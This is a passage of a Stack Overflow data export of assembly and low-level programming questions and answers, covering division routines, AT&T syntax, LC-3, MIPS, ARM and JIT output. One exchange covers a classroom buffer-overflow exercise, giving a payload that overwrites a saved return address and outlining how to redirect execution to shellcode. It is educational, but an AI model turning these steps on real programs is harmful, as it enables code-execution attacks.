<p>Thank you for the answers so far. However, it appears to me that the suggested algorithms would be quite slow - wouldn't the fastest way to perform a 128-bit by 64-bit division be to leverage the processor's native support for 64-bit by 32-bit division? Does anyone know if there is a way to perform the larger division in terms of a few smaller divisions?</p>

<p><strong>Re: How often does B change?</strong></p>

<p>Primarily I'm interested in a general solution - what calculation would you perform if A and B are likely to be different every time?</p>

<p>However, a second possible situation is that B does not vary as often as A - there may be as many as 200 As to divide by each B. How would your answer differ in this case?</p>
","<p>You can use the division version of <a href=""http://mathforum.org/dr.math/faq/faq.peasant.html"" rel=""nofollow noreferrer"">Russian Peasant Multiplication</a>.</p>

<p>To find the remainder, execute (in pseudo-code):</p>

<pre><code>X = B;

while (X &lt;= A/2)
{
    X &lt;&lt;= 1;
}

while (A &gt;= B)
{
    if (A &gt;= X)
        A -= X;
    X &gt;&gt;= 1;
}
</code></pre>

<p>The modulus is left in A.</p>

<p>You'll need to implement the shifts, comparisons and subtractions to operate on values made up of a pair of 64 bit numbers, but that's fairly trivial.</p>

<p>This will loop at most 255 times (with a 128 bit A).  Of course you need to do a pre-check for a zero divisor.</p>
","2566570"
"Help translating from assembly to C","13393","","<p>I have some code from a function</p>

<pre><code>subl $24, %esp
movl 8(%ebp), %eax
cmpl 12(%ebp), %eax
</code></pre>

<p>Before the code is just the 'ENTER' command and afterwards there's an if statement to return 1 if ebp > eax or 0 if it's less. I'm assuming cmpl means compare, but I can't tell what the concrete values are. Can anyone tell me what's happening?</p>
","<p>Yes <code>cmpl</code> means compare (with 4-byte arguments). Suppose the piece of code is followed by a <code>jg &lt;addr&gt;</code>:</p>

<pre><code>movl 8(%ebp), %eax
cmpl 12(%ebp), %eax
jg &lt;addr&gt;
</code></pre>

<p>Then the code is similar to</p>

<pre><code>eax = ebp[8];
if (eax &gt; ebp[12])
   goto &lt;addr&gt;;
</code></pre>
","2778721"
"masm division overflow","13353","","<p>I'm trying divide two numbers in assembly. I'm working out of the Irvine assembly for intel computers book and I can't make division work for the life of me.</p>

<p>Here's my code</p>

<pre><code>.code
main PROC
    call division
    exit
main ENDP

division PROC
    mov eax, 4
    mov ebx, 2
    div ebx
    call WriteDec
    ret
divison ENDP

END main
</code></pre>

<p>Where WriteDec should write whatever number is in the eax register (should be set to the quotient after the division call). Instead everytime I run it visual studio crashes (the program does compile however).</p>
","<p>You need to zero extend your EDX register before doing the division:</p>

<pre><code>mov eax, 4
mov ebx, 2
xor edx, edx          ;set edx to zero
div ebx
call WriteDec
</code></pre>

<p>the <code>;set edx to zero</code> is a comment in MASM. I don't know if it'll work if you are using inline assembly in C, so don't copy it if you are :)</p>
","2255984"
"saving a string of chars in assembly LC-3","13322","","<p>I am trying to make a simple program using the LC-3 Architecture.
All I am trying to do is read a string from the console, somehow save it in memory, and then print it back out.</p>

<p>This is what I have so Far</p>

<pre><code>; This program attemps to read a string and then output it

        .orig   x3000
        and     r1,r1,0
    lea     r0,prompt 
    puts
loop:
    getc
    putc
    add r4,r4,1
    ld      r7,nlcomp  ; check for 
    add     r7,r7,r0   ; end of line

brz finish

    st  r0,lets
    br      loop

finish:

    lea r0,lets
    puts

    halt

lets:  .blkw   20   
prompt: .stringz ""Emter String""
nlcomp  .fill   xfff6        
.end
</code></pre>

<p>The output displays only the last char in the string. If I was to enter ""steve"" it would  print out ""e""</p>

<p>Obviously my problem is that I need to somehow save each char I read in, into its own memory location. I thought using the .blkw would do this, but apparently all it does it overwrite the bits that are in that position.</p>

<p>MY question is how do I store chars in sequential memory locations and then print them out to the console?</p>
","<p>You need to use the STR instruction, which allows you to do base-offset addressing.  The syntax for STR is:</p>

<pre><code>STR &lt;src register&gt; &lt;base register&gt; &lt;immediate offset&gt;
</code></pre>

<p>So, something like the following would be valid:</p>

<pre><code>    LEA R1,MEMORYSPACE ; saves the address of the storage memory block
loop:
    GETC               ; input character -&gt; r0
    PUTC               ; r0 -&gt; console
    STR R0,R1,#0       ; r0 -&gt; ( memory address stored in r1 + 0 )
    ADD R1,R1,#1       ; increments the memory pointer so that it
                       ; always points at the next available block
    BR loop

MEMORYSPACE .blkw 100  ; declares empty space to store the string
</code></pre>
","20412630"
"View disassembly in XCode 4 (or Xcode 5 or Xcode 6)","13319","","<p>I'm having trouble finding much in the way of information about the new XCode layout. How can I view the disassembly of my source file, rather than just the C++ code?</p>
","<p>In Xcode 4.2 (and Xcode 5), you can see the assembly or disassembly for a file by:</p>

<ol>
<li>Showing the assistant editor (command+option+Enter is the default shortcut).</li>
<li>In the JumpBar, select the tuxedo icon and select ""Assembly"" or ""Disassembly"" from the drop-down list.</li>
</ol>

<p>You can view the Assembly for a file whether or not you're running the application. Disassembly is only available when the application is running and being debugged.</p>
","7879602"
"What is JB used for here?","13292","","<p>I'm trying to understand some example asm that came with a development board (XL400), with a view to converting it to C.</p>

<p>The asm code is included below, unfortunately the documentation, such as it is, is translated very badly from Chinese, which makes it worse than useless.
Also its a long time since I've used asm!</p>

<p>In the code there is a JB instruction in the DELAY subroutine (third last line of code). I cannot understand what it does or how it is supposed to operate. Googling JB results in explanation for a different form (JB label) so Im not sure if the asm is right even??
Help much appreciated, Ta</p>

<pre><code> RS EQU P2.0
 RW EQU P2.1
 E EQU P2.2
 ORG 0080H
 MOV P0,#00000001B  ;- Screen
 ACALL ENABLE
 MOV P0,#00000001B  ;- Screen
 ACALL ENABLE
 MOV P0,#00111000B  ;Display
 ACALL ENABLE
 MOV P0,#00001111B  ;Show switch control
 ACALL ENABLE
 MOV P0,#00000110B  ;Input mode
 ACALL ENABLE
 MOV P0,#0C0H       ;Data memory address
 ACALL ENABLE
 mov p0,#01000001b  ;ASCII code
 SETB RS
 CLR RW
 CLR E
 ACALL DELAY
 SETB E
 AJMP $

ENABLE: CLR RS           ;Send orders
 CLR RW
 CLR E
 ACALL DELAY
 SETB E
 RET

DELAY: MOV P0,#0FFH
 CLR RS
 SETB RW
 CLR E
 NOP
 SETB E
 JB P0.7,DELAY      ;Judgement busy signs
 RET

 END
</code></pre>
","<p>The JB instruction in 8051 assembler jumps to the address indicated by the label in the second operand if the bit specified by the first operand is set.  So in your case it will jump to <code>MOV P0,#0FFH</code> if <code>P0.7</code> is set.</p>

<p>The <code>JB label</code> instruction you are referring to is an 8086 instruction (jump below based on the result of the CMP instruction just before) so you were looking on the wrong page.</p>

<p>EDIT: I don't know exactly what type of LCD they're using but I think it's the busy flag - as these displays are all rather closely related to the venerable <a href=""http://en.wikipedia.org/wiki/Hitachi_HD44780_LCD_controller"" rel=""nofollow"">Hitachi 44780</a>.  In the board's <a href=""http://www.51c51.com/enweb/down/xl400sch.pdf"" rel=""nofollow"">schematic</a> P0.7 is connected to display pin 14, which commonly is DB7, and that's where the busy flag lives.  Of course it's always best to use the documentation of the actual display, but <a href=""http://www.sparkfun.com/datasheets/LCD/GDM1602K-Extended.pdf"" rel=""nofollow"">this one</a> is probably pretty close and could get you started.  Also, that display is <em>so popular</em> that it's very easy to find code in all possible languages on howto program it.  Might be easier to follow that route than to reverse engineer the assembly.</p>
","13472998"
"How can I examine assembly in Xcode 4?","13236","","<p>I'm tuning some code that runs in a tight loop in my iPhone app and I'm curious to see the generated assembly code to see if anything looks out of the ordinary.</p>

<p>In Xcode 3.x, there was a <em>Build > Show Assembly Code</em> option in the menu, but I don't see anything in the menus or the documentation for Xcode 4.</p>

<p>Anyone know how to do this? I could do ""gcc -S"" but my understanding is that that won't be identical to how the entire project is compiled.</p>
","<p>The ""View Disassembly"" option is gone, as far as I can tell.</p>

<p>Here's one workaround:</p>

<ol>
<li>Build your project</li>
<li>Open the build log, and use the search window to find the compile command that was used to build the source file you're interested in.  Copy the entire build command.</li>
<li>Open a terminal window, and cd to your project directory.</li>
<li>Paste the build command from the build log into the terminal, and append <code>-save-temps</code>.  Hit enter.</li>
<li>You now have two new files, <code>yourFile.i</code> and <code>yourFile.s</code>, which are the preprocessed source and generated assembly, respectively, built exactly as they are in your project.</li>
</ol>

<p>Alternatively, you can disassemble the built binary (or the object file resulting from your source file) using <code>otool -tvV /path/to/binaryOrDotOFile</code>.</p>

<p>Finally, if this is a feature that you would like to have back, make sure to file a bug report!</p>

<p><strong>Edit:</strong>
This feature is back in Xcode 4.1.  In the assistant editor pane, select ""Generated Output -> YourFilename (Assembly)"".  Boom!</p>
","5435470"
"Error: selected processor does not support ARM mode `wfi'","13230","","<p>I'm getting the following errors while trying to compile an ARM embedded C program (I'm using YAGARTO as my cross compiler). I'm trying to work out what this error means and what are the steps to correct it. From the research I've done so far, the issue it seems to be <code>wfi</code>, and <code>wfe</code> are not ASM instruction. How could I fix this?</p>

<pre><code>\cc9e5oJe.s: Assembler messages:
\cc9e5oJe.s:404: Error: selected processor does not support ARM mode `wfi'
\cc9e5oJe.s:414: Error: selected processor does not support ARM mode `wfe'
\cc9e5oJe.s:477: Error: selected processor does not support ARM mode `wfi'
make: *** [STM32F10x_StdPeriph_Driver/src/stm32f10x_pwr.o] Error 1
</code></pre>
","<p>You might miss some vital compiler options for your STM32F10x - which is a Cortex M3:</p>

<pre><code>-mcpu=cortex-m3 -mthumb -mno-thumb-interwork -mfpu=vfp -msoft-float -mfix-cortex-m3-ldrd
</code></pre>
","13687485"
"Using buffer overflow to execute shell code","13172","","<p>I've been learning computer security lately and come across a couple problems, and i'm having some trouble with this one in particular. </p>

<p>I'm given a function with a fixed buffer I need to overflow in order to execute shellcode in the file <em>shellcode</em>. The function is quite simple:</p>

<pre><code>void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    //function provided to display stack on command prompt
    dump_stack((void **) buf, 21, (void **) &amp;str);
}
</code></pre>

<p>My initial guess was to modify the return address, the <em>eip</em>, of the function in order to locate and execute what is in the shellcode file, but i realized I have no address to the file I can represent in a hexadecimal value. I am <strong>pretty sure</strong> I need to manipulate the return address, so currently what i'm calling is:</p>

<pre><code>//the string is passed as a command line arg
./buffer_overflow_shellcode $(python -c ""print 'A'*72 + '\x41\xd6\xff\xff' "")
</code></pre>

<p>my output is:</p>

<pre><code>Stack dump:
0xffffd600: 0xffffd7fd (first argument)
0xffffd5fc: 0x08048653 (saved eip)
0xffffd5f8: 0xffffd641 (saved ebp)
0xffffd5f4: 0x41414141
0xffffd5f0: 0x41414141
0xffffd5ec: 0x41414141
0xffffd5e8: 0x41414141
0xffffd5e4: 0x41414141
0xffffd5e0: 0x41414141
0xffffd5dc: 0x41414141
0xffffd5d8: 0x41414141
0xffffd5d4: 0x41414141
0xffffd5d0: 0x41414141
0xffffd5cc: 0x41414141
0xffffd5c8: 0x41414141
0xffffd5c4: 0x41414141
0xffffd5c0: 0x41414141
0xffffd5bc: 0x41414141
0xffffd5b8: 0x41414141
0xffffd5b4: 0x41414141
0xffffd5b0: 0x41414141 (beginning of buffer)
Segmentation fault
</code></pre>

<p>the python script simply prints 72 letter A's to overflow the buffer to the point of the <em>edp</em> and <em>eip</em>, after I replace the edp's address with the additional address and arrive at the return address, ready to manipulate it. Any help is really appreciated, thanks!</p>
","<p>Well, I think maybe this is a like a Buffer Overflow Lab in <em>Computer Systems: A Programmer's Perspective</em>. First, use <code>objdump</code> to get the static address. Second, run it with <code>gdb</code> to find out the address of the stack. Then, fill the buffer with such a string that overwrites the return address to the buffer (so that you can put exploit code, alternatively, you could invoke other code in the program).</p>

<p>Check out this <a href=""http://ipads.se.sjtu.edu.cn/courses/ics/labs/lab3.pdf"" rel=""nofollow noreferrer"">pdf</a> which serves as a guide to this lab. It could provide you with some insights.</p>

<p>As is pointed out, lots of compile time flags are needed to achieve this. ( I would check out which and come back soon ). Alternatively, <a href=""https://unix.stackexchange.com/questions/66802/disable-stack-protection-on-ubuntu-for-buffer-overflow-without-c-compiler-flags"">this</a> post provides a guide on how to compile such an example.</p>
","16369822"
"Strange assembly from array 0-initialization","13170","","<p>Inspired by the question <a href=""https://stackoverflow.com/questions/453432/difference-in-initalizing-and-zeroing-an-array-in-c-c"">Difference in initalizing and zeroing an array in c/c++ ?</a>, I decided to actually examine the assembly of, in my case, an optimized release build for Windows Mobile Professional (ARM processor, from the Microsoft Optimizing Compiler). What I found was somewhat surprising, and I wonder if someone can shed some light on my questions concerning it.</p>

<p>These two examples are examined:</p>

<pre><code>byte a[10] = { 0 };

byte b[10];
memset(b, 0, sizeof(b));
</code></pre>

<p>They are used in the same function, so the stack looks like this:</p>

<pre><code>[ ] // padding byte to reach DWORD boundary
[ ] // padding byte to reach DWORD boundary
[ ] // b[9] (last element of b)
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
[ ] // b[0] = sp + 12 (stack pointer + 12 bytes)
[ ] // padding byte to reach DWORD boundary
[ ] // padding byte to reach DWORD boundary
[ ] // a[9] (last element of a)
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
[ ]
[ ] // a[0] = sp (stack pointer, at bottom)
</code></pre>

<p>The generated assembly with my comments:</p>

<pre><code>; byte a[10] = { 0 };

01: mov   r3, #0        // r3 = 0
02: mov   r2, #9        // 3rd arg to memset: 9 bytes, note that sizeof(a) = 10
03: mov   r1, #0        // 2nd arg to memset: 0-initializer
04: add   r0, sp, #1    // 1st arg to memset: &amp;a[1] = a + 1, since only 9 bytes will be set
05: strb  r3, [sp]      // a[0] = r3 = 0, sets the first element of a
06: bl    memset        // continue in memset

; byte b[10];
; memset(b, 0, sizeof(b));

07: mov   r2, #0xA      // 3rd arg to memset: 10 bytes, sizeof(b)
08: mov   r1, #0        // 2nd arg to memset: 0-initializer
09: add   r0, sp, #0xC  // 1st arg to memset: sp + 12 bytes (the 10 elements
                        // of a + 2 padding bytes for alignment) = &amp;b[0]
10: bl    memset        // continue in memset
</code></pre>

<p>Now, there are two things that confuses me:</p>

<ol>
<li>What's the point of lines 02 and 05? Why not just give &amp;a[0] and 10 bytes to memset?</li>
<li>Why isn't the padding bytes of a 0-initialized? Is that only for padding in structs?</li>
</ol>

<p>Edit: I was too curious to not test the struct case:</p>

<pre><code>struct Padded
{
    DWORD x;
    byte y;
};
</code></pre>

<p>The assembler for 0-initializing it:</p>

<pre><code>; Padded p1 = { 0 };

01: mov   r3, #0
02: str   r3, [sp]
03: mov   r3, #0
04: str   r3, [sp, #4]

; Padded p2;
; memset(&amp;p2, 0, sizeof(p2));

05: mov   r3, #0
06: str   r3, [sp]
07: andcs r4, r0, #0xFF
08: str   r3, [sp, #4]
</code></pre>

<p>Here we see in line 04 that a padding indeed occur, since <code>str</code> (as opposed to <code>strb</code>) is used. Right?</p>
","<p>The reason for lines 2 and 5 is because you specified a 0 in the array initializer.  The compiler will initialize all constants then pad out the rest using memset.  If you were to put two zeros in your initializer, you'd see it strw (word instead of byte) then memset 8 bytes.</p>

<p>As for the padding, it's only used to align memory accesses -- the data shouldn't be used under normal circumstances, so memsetting it is wasteful.</p>

<p>Edit: For the record, I may be wrong about the strw assumption above.  99% of my ARM experience is reversing code generated by GCC/LLVM on the iPhone, so my assumption may not carry over to MSVC.</p>
","531489"
"g++ 4.6.1 compiler error: Error: unknown pseudo-op: `.cfi_personality'","13118","","<p>I have a file which compiles without errors or warnings on my macbook pro running osx (snow leopard) using g++ (4.6.1). I just uploaded it to our linux cluster (not run by me) and tried to compile there (also using gcc 4.6.1). This time I many strange error messages with the assembler. How do I interpret the following error?</p>

<pre><code>g++ -I../shared/boost_1_47_0 -std=c++0x -O2  -c ../shared/ft.cpp -o ../shared/ft.o

/tmp/ccEqihNa.s: Assembler messages:
/tmp/ccEqihNa.s:809: Error: unknown pseudo-op: `.cfi_personality'
/tmp/ccEqihNa.s:810: Error: unknown pseudo-op: `.cfi_lsda'
/tmp/ccEqihNa.s:1055: Error: unknown pseudo-op: `.cfi_personality'
/tmp/ccEqihNa.s:1056: Error: unknown pseudo-op: `.cfi_lsda'
:145: Error: unknown pseudo-op: `.cfi_personality'
:146: Error: unknown pseudo-op: `.cfi_lsda'
:248: Error: unknown pseudo-op: `.cfi_personality'
:249: Error: unknown pseudo-op: `.cfi_lsda'
:351: Error: unknown pseudo-op: `.cfi_personality'
:352: Error: unknown pseudo-op: `.cfi_lsda'
:496: Error: unknown pseudo-op: `.cfi_personality'
:497: Error: unknown pseudo-op: `.cfi_lsda'
:988: Error: unknown pseudo-op: `.cfi_personality'
:989: Error: unknown pseudo-op: `.cfi_lsda'
:1488: Error: unknown pseudo-op: `.cfi_personality'
:1489: Error: unknown pseudo-op: `.cfi_lsda'
:2333: Error: unknown pseudo-op: `.cfi_personality'
:2334: Error: unknown pseudo-op: `.cfi_lsda'
:2460: Error: unknown pseudo-op: `.cfi_personality'
:2461: Error: unknown pseudo-op: `.cfi_lsda'
:2899: Error: unknown pseudo-op: `.cfi_personality'
:2900: Error: unknown pseudo-op: `.cfi_lsda'
:3053: Error: unknown pseudo-op: `.cfi_personality'
:3054: Error: unknown pseudo-op: `.cfi_lsda'
:3144: Error: unknown pseudo-op: `.cfi_personality'
:3145: Error: unknown pseudo-op: `.cfi_lsda'
:3205: Error: unknown pseudo-op: `.cfi_personality'
:3206: Error: unknown pseudo-op: `.cfi_lsda'
:3296: Error: unknown pseudo-op: `.cfi_personality'
:3297: Error: unknown pseudo-op: `.cfi_lsda'
:4090: Error: unknown pseudo-op: `.cfi_personality'
:4091: Error: unknown pseudo-op: `.cfi_lsda'
:4921: Error: unknown pseudo-op: `.cfi_personality'
:4922: Error: unknown pseudo-op: `.cfi_lsda'
:5094: Error: unknown pseudo-op: `.cfi_personality'
:5095: Error: unknown pseudo-op: `.cfi_lsda'
:5274: Error: unknown pseudo-op: `.cfi_personality'
:5275: Error: unknown pseudo-op: `.cfi_lsda'
:5365: Error: unknown pseudo-op: `.cfi_personality'
:5366: Error: unknown pseudo-op: `.cfi_lsda'
:5426: Error: unknown pseudo-op: `.cfi_personality'
:5427: Error: unknown pseudo-op: `.cfi_lsda'
:5525: Error: unknown pseudo-op: `.cfi_personality'
:5526: Error: unknown pseudo-op: `.cfi_lsda'
:5744: Error: unknown pseudo-op: `.cfi_personality'
:5745: Error: unknown pseudo-op: `.cfi_lsda'
:5919: Error: unknown pseudo-op: `.cfi_personality'
:5920: Error: unknown pseudo-op: `.cfi_lsda'
:6097: Error: unknown pseudo-op: `.cfi_personality'
:6098: Error: unknown pseudo-op: `.cfi_lsda'
:6209: Error: unknown pseudo-op: `.cfi_personality'
:6210: Error: unknown pseudo-op: `.cfi_lsda'
:6305: Error: unknown pseudo-op: `.cfi_personality'
:6306: Error: unknown pseudo-op: `.cfi_lsda'
:6735: Error: unknown pseudo-op: `.cfi_personality'
:6736: Error: unknown pseudo-op: `.cfi_lsda'
:7082: Error: unknown pseudo-op: `.cfi_personality'
:7083: Error: unknown pseudo-op: `.cfi_lsda'
:7355: Error: unknown pseudo-op: `.cfi_personality'
:7356: Error: unknown pseudo-op: `.cfi_lsda'
:7663: Error: unknown pseudo-op: `.cfi_personality'
:7664: Error: unknown pseudo-op: `.cfi_lsda'
:8139: Error: unknown pseudo-op: `.cfi_personality'
:8140: Error: unknown pseudo-op: `.cfi_lsda'
:8605: Error: unknown pseudo-op: `.cfi_personality'
:8606: Error: unknown pseudo-op: `.cfi_lsda'
:8894: Error: unknown pseudo-op: `.cfi_personality'
:8895: Error: unknown pseudo-op: `.cfi_lsda'
:9224: Error: unknown pseudo-op: `.cfi_personality'
:9225: Error: unknown pseudo-op: `.cfi_lsda'
:9531: Error: unknown pseudo-op: `.cfi_personality'
:9532: Error: unknown pseudo-op: `.cfi_lsda'
:9868: Error: unknown pseudo-op: `.cfi_personality'
:9869: Error: unknown pseudo-op: `.cfi_lsda'
:10313: Error: unknown pseudo-op: `.cfi_personality'
:10314: Error: unknown pseudo-op: `.cfi_lsda'
:10533: Error: unknown pseudo-op: `.cfi_personality'
:10534: Error: unknown pseudo-op: `.cfi_lsda'
:11052: Error: unknown pseudo-op: `.cfi_personality'
:11053: Error: unknown pseudo-op: `.cfi_lsda'
:11324: Error: unknown pseudo-op: `.cfi_personality'
:11325: Error: unknown pseudo-op: `.cfi_lsda'
:13561: Error: unknown pseudo-op: `.cfi_personality'
:13562: Error: unknown pseudo-op: `.cfi_lsda'
:13941: Error: unknown pseudo-op: `.cfi_personality'
:13942: Error: unknown pseudo-op: `.cfi_lsda'
:14340: Error: unknown pseudo-op: `.cfi_personality'
:14341: Error: unknown pseudo-op: `.cfi_lsda'
:14711: Error: unknown pseudo-op: `.cfi_personality'
:14712: Error: unknown pseudo-op: `.cfi_lsda'
:14862: Error: unknown pseudo-op: `.cfi_personality'
:14863: Error: unknown pseudo-op: `.cfi_lsda'
:14963: Error: unknown pseudo-op: `.cfi_personality'
:14964: Error: unknown pseudo-op: `.cfi_lsda'
:15381: Error: unknown pseudo-op: `.cfi_personality'
:15382: Error: unknown pseudo-op: `.cfi_lsda'
:15792: Error: unknown pseudo-op: `.cfi_personality'
:15793: Error: unknown pseudo-op: `.cfi_lsda'
:16293: Error: unknown pseudo-op: `.cfi_personality'
:16294: Error: unknown pseudo-op: `.cfi_lsda'
:16445: Error: unknown pseudo-op: `.cfi_personality'
:16446: Error: unknown pseudo-op: `.cfi_lsda'
:17045: Error: unknown pseudo-op: `.cfi_personality'
:17046: Error: unknown pseudo-op: `.cfi_lsda'
:18020: Error: unknown pseudo-op: `.cfi_personality'
:18021: Error: unknown pseudo-op: `.cfi_lsda'
:18111: Error: unknown pseudo-op: `.cfi_personality'
:18112: Error: unknown pseudo-op: `.cfi_lsda'
:18172: Error: unknown pseudo-op: `.cfi_personality'
:18173: Error: unknown pseudo-op: `.cfi_lsda'
:139: Error: unknown pseudo-op: `.cfi_personality'
:140: Error: unknown pseudo-op: `.cfi_lsda'
:554: Error: unknown pseudo-op: `.cfi_personality'
:555: Error: unknown pseudo-op: `.cfi_lsda'
:654: Error: unknown pseudo-op: `.cfi_personality'
:655: Error: unknown pseudo-op: `.cfi_lsda'
:1344: Error: unknown pseudo-op: `.cfi_personality'
:1345: Error: unknown pseudo-op: `.cfi_lsda'
:1831: Error: unknown pseudo-op: `.cfi_personality'
:1832: Error: unknown pseudo-op: `.cfi_lsda'
:2522: Error: unknown pseudo-op: `.cfi_personality'
:2523: Error: unknown pseudo-op: `.cfi_lsda'
:3061: Error: unknown pseudo-op: `.cfi_personality'
:3062: Error: unknown pseudo-op: `.cfi_lsda'
:3284: Error: unknown pseudo-op: `.cfi_personality'
:3285: Error: unknown pseudo-op: `.cfi_lsda'
:3515: Error: unknown pseudo-op: `.cfi_personality'
:3516: Error: unknown pseudo-op: `.cfi_lsda'
:3745: Error: unknown pseudo-op: `.cfi_personality'
:3746: Error: unknown pseudo-op: `.cfi_lsda'
:3996: Error: unknown pseudo-op: `.cfi_personality'
:3997: Error: unknown pseudo-op: `.cfi_lsda'
:4518: Error: unknown pseudo-op: `.cfi_personality'
:4519: Error: unknown pseudo-op: `.cfi_lsda'
:5489: Error: unknown pseudo-op: `.cfi_personality'
:5490: Error: unknown pseudo-op: `.cfi_lsda'
:6382: Error: unknown pseudo-op: `.cfi_personality'
:6383: Error: unknown pseudo-op: `.cfi_lsda'
:6547: Error: unknown pseudo-op: `.cfi_personality'
:6548: Error: unknown pseudo-op: `.cfi_lsda'
:6651: Error: unknown pseudo-op: `.cfi_personality'
:6652: Error: unknown pseudo-op: `.cfi_lsda'
:6712: Error: unknown pseudo-op: `.cfi_personality'
:6713: Error: unknown pseudo-op: `.cfi_lsda'
:7146: Error: unknown pseudo-op: `.cfi_personality'
:7147: Error: unknown pseudo-op: `.cfi_lsda'
:7367: Error: unknown pseudo-op: `.cfi_personality'
:7368: Error: unknown pseudo-op: `.cfi_lsda'
:7597: Error: unknown pseudo-op: `.cfi_personality'
:7598: Error: unknown pseudo-op: `.cfi_lsda'
:9275: Error: unknown pseudo-op: `.cfi_personality'
:9276: Error: unknown pseudo-op: `.cfi_lsda'
:9562: Error: unknown pseudo-op: `.cfi_personality'
:9563: Error: unknown pseudo-op: `.cfi_lsda'
:10065: Error: unknown pseudo-op: `.cfi_personality'
:10066: Error: unknown pseudo-op: `.cfi_lsda'
:10326: Error: unknown pseudo-op: `.cfi_personality'
:10327: Error: unknown pseudo-op: `.cfi_lsda'
:10534: Error: unknown pseudo-op: `.cfi_personality'
:10535: Error: unknown pseudo-op: `.cfi_lsda'
:11978: Error: unknown pseudo-op: `.cfi_personality'
:11979: Error: unknown pseudo-op: `.cfi_lsda'
:12091: Error: unknown pseudo-op: `.cfi_personality'
:12092: Error: unknown pseudo-op: `.cfi_lsda'
:12936: Error: unknown pseudo-op: `.cfi_personality'
:12937: Error: unknown pseudo-op: `.cfi_lsda'
:14294: Error: unknown pseudo-op: `.cfi_personality'
:14295: Error: unknown pseudo-op: `.cfi_lsda'
:16088: Error: unknown pseudo-op: `.cfi_personality'
:16089: Error: unknown pseudo-op: `.cfi_lsda'
</code></pre>
","<p>The error means that your assembler (likely <code>/usr/bin/as</code>, part of binutils) is too old.</p>

<p>The patch that added them appears to be <a href=""http://www.cygwin.com/ml/binutils/2006-11/msg00007.html"" rel=""noreferrer"">this one</a>. Unfortunately, the binutils NEWS file doesn't explicitly reference this addition, but since it was added in 2006, I expect any recent version of binutils would do.</p>
","8873409"
"What do the dollar ($) and percentage (%) signs represent in assembly intel x86?","13079","","<p>I am trying to understand how the assembly language works for a micro-computer architecture class, and I keep facing different syntaxes in examples:</p>

<pre><code>sub $48, %esp
mov %eax, 32(%esp)
</code></pre>

<p>What do these codes mean? What is the 32 operand an addition to the esp register?</p>
","<p>Thats not Intel syntax, its <a href=""http://en.wikipedia.org/wiki/X86_assembly_language#Syntax"" rel=""nofollow noreferrer"">AT&amp;T syntax</a>, also called <a href=""http://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax"" rel=""nofollow noreferrer"">GAS syntax</a>.</p>

<p>the <code>$</code> prefix is for immidiates (constants), and the <code>%</code> prefix is for registers (they are *required**).</p>

<p>*Unless the <code>noprefix</code> option is specified, see <a href=""https://stackoverflow.com/questions/549347/how-to-use-address-constants-in-gcc-x86-inline-assembly"">here</a> &amp; <a href=""https://sourceware.org/binutils/docs/as/i386_002dVariations.html"" rel=""nofollow noreferrer"">here</a>.</p>
","9196757"
"What does this Intel jmpq instruction do?","13024","","<p>How is the address <code>0x600860</code> computed in the Intel instruction below? <code>0x4003b8</code> + <code>0x2004a2</code> = <code>60085a</code>, so I don't see how the computation is carried out.</p>

<p><code>0x4003b8 &lt;puts@plt&gt;:   jmpq   *0x2004a2(%rip)        # 0x600860 &lt;puts@got.plt&gt;</code></p>
","<p>On Intel, JMP, CALL, etc. are relative to the program counter of the <em>next</em> instruction.</p>

<p>The next instruction in your case was at <code>0x4003be</code>, and <code>0x4003be + 0x2004a2 == 0x600860</code></p>
","20251188"
"How to see JIT-compiled code in JVM?","13001","","<p>Is there some way to see the native code produces by the JIT in a JVM?</p>
","<p>Assuming you're using the Sun Hotspot JVM. Add the flag </p>

<blockquote>
  <p>-XX:+PrintOptoAssembly</p>
</blockquote>

<p>To whatever you're running. This will only print the assembly for code that has been JIT'd (i.e. you don't get to see assembly for non JIT'd stuff) but I think that's what you want. If you want to see what everything would like if it were JIT'd you could probably tweak the JIT threshold via:</p>

<blockquote>
  <p>-XX:CompileThreshold=#</p>
</blockquote>
","1503919"
"Finding the Max and Min values of a 10 element array in MIPS","12927","","<p>I am still very much a newbie once it comes to MIPS programming so bear with me.  I am trying to write a function that goes through a 10 element array and returns the max and minimum values of the array.  So far I have:</p>

<pre><code>.data

X .word 31, 17, 92, 46, 172, 208, 13, 93, 65, 112
N .word 10
minValue .asciiz ""Minimum Value: ""
maxValue .asciiz ""\nMaximum Value: ""
values .asciiz ""\nValues divisible by 4: ""


.text

main:

la $a0, X
la $a1, N


jal MaxMin


MaxMin:
lw $t0, 0($a0)


swap:
move $t0, $s0
move $s0, $s1
move $s0, $t0
</code></pre>

<p>The MaxMin function is supposed to return the maximum and minimum values of the X array for me to print out.  My plan is to go through the array and if an element is greater than or less than another element, they get swapped using the swap function.  The problem is I have no idea how to go about doing this because I do not really know the syntax that you are supposed to use when dealing with arrays.  If anyone could help I would appreciate it.</p>
","<p>Here an idea of how to read and print elements of an array through a function. Would make comparisons and make the swap.</p>

<pre><code>.data
space: .asciiz "" ""
X: .word 31, 17, 92, 46, 172, 208, 13, 93, 65, 112
N: .word 10

.text
main:   la $a0, X       #$a0=load address of array X
    lw $a1, N       #$a1=10  --number elements
    jal readArray  #call readArray
    li $v0, 10      #exit program   
    syscall 

readArray:
    li $t0, 0       #$t0=0
    li $t1, 0       #$t1=0
buc:    bge $t0, $a1, final #if  $t0 &gt;= $a1 then goto final
    lw $a0, X($t1) #$a0 = X(i)
    li $v0, 1       #Print integer              
    syscall

    la $a0, space   #load a space:  "" ""
    li $v0, 4       #print string               
    syscall

    addi $t1, $t1, 4    #Every 4 bytes there is an integer in the array
    addi $t0, $t0, 1    #$t0=$t0+1
    b buc       #goto buc
final:  
    jr $ra      #return
</code></pre>
","26479682"
"Do programming language compilers first translate to assembly or directly to machine code?","12893","","<p>I'm primarily interested in popular and widely used compilers, such as gcc. But if things are done differently with different compilers, I'd like to know that, too.</p>

<p>Taking gcc as an example, does it compile a short program written in C directly to <em>machine</em> code, or does it first translate it to human-readable assembly, and only then uses an (in-built?) assembler to translate the assembly program into binary, <em>machine</em> code -- a series of instructions to the CPU?</p>

<p>Is using assembly code to create a binary executable a significantly expensive operation? Or is it a relatively simple and quick thing to do?</p>

<p>(Let's assume we're dealing with only the x86 family of processors, and all programs are written for Linux.)</p>

<p>I'd be very grateful for any help and thought on the matter. Thank you!</p>
